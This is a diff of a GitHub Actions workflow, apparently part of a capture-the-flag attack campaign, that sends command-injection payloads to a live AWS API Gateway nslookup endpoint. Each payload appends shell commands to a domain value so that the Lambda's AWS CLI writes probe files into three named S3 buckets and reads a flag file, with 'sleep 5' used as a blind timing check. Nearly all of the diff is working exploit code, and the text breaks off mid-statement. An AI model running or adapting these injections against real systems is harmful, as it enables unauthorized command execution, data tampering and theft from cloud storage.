@@ -1,4 +1,4 @@
-name: Stage2-11-Confirm-Domain-Injection
+name: Stage2-12-Test-Lambda-S3-Permissions
 
 on:
   push:
@@ -10,7 +10,7 @@ permissions:
   id-token: write
 
 jobs:
-  timing:
+  test:
     runs-on: ubuntu-latest
 
     steps:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Run timing probes
+      - name: Test Lambda role S3 permissions
         run: |
           python3 - <<'PY'
           import os
@@ -32,7 +32,7 @@ jobs:
           import requests
           from requests_aws4auth import AWS4Auth
 
-          base = (
+          api = (
               "https://3q931syi7b.execute-api.us-east-1.amazonaws.com"
               "/dev/nslookup"
           )
@@ -47,28 +47,60 @@ jobs:
 
           tests = [
               (
-                  "baseline_body",
-                  base,
-                  {"domain": "example.com"}
+                  "write_user_bucket",
+                  "example.com; "
+                  "printf CTF_PROBE > /tmp/ctf_probe; "
+                  "/opt/aws s3api put-object "
+                  "--bucket userad88e2b168aa387e "
+                  "--key ctf-probe.txt "
+                  "--body /tmp/ctf_probe "
+                  "--region us-east-1 "
+                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
+                  ">/tmp/aws_result 2>&1 && sleep 5"
               ),
               (
-                  "sleep_body",
-                  base,
-                  {"domain": "example.com; sleep 5"}
+                  "write_log_bucket",
+                  "example.com; "
+                  "printf CTF_PROBE > /tmp/ctf_probe; "
+                  "/opt/aws s3api put-object "
+                  "--bucket logad88e2b168aa387e "
+                  "--key ctf-probe.txt "
+                  "--body /tmp/ctf_probe "
+                  "--region us-east-1 "
+                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
+                  ">/tmp/aws_result 2>&1 && sleep 5"
               ),
               (
-                  "sleep_query",
-                  base + "?domain=example.com%3B%20sleep%205",
-                  {}
+                  "write_site_bucket",
+                  "example.com; "
+                  "printf CTF_PROBE > /tmp/ctf_probe; "
+                  "/opt/aws s3api put-object "
+                  "--bucket site781fe43f26b9eba3 "
+                  "--key ctf-probe.txt "
+                  "--body /tmp/ctf_probe "
+                  "--region us-east-1 "
+                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
+                  ">/tmp/aws_result 2>&1 && sleep 5"
+              ),
+              (
+                  "read_flag",
+                  "example.com; "
+                  "/opt/aws s3api get-object "
+                  "--bucket userad88e2b168aa387e "
+                  "--key flag.txt "
+                  "/tmp/flag.txt "
+                  "--region us-east-1 "
+                  "--endpoint-url https://s3.us-east-1.amazonaws.com "
+                  ">/tmp/aws_result 2>&1 && sleep 5"
               )
           ]
 
-          for name, url, body in tests:
+          for name, injected_domain in tests:
               start = time.monotonic()
 
               response = requests.post(
-                  url,
-                  json=body,
+                  api,
+                  json={"domain": injected_domain},
                   auth=auth,
                   timeout=20
               )
@@ -76,8 +108,4 @@ jobs:
               elapsed = time.monotonic() - start
 
               print(f"TEST={name}")
-              print(f"HTTP={response.status_code}")
-              print(f"ELAPSED={elapsed:.2f}")
-              print(response.text)
-              print("---")
-          PY
+              print(f"HTTP={response.status
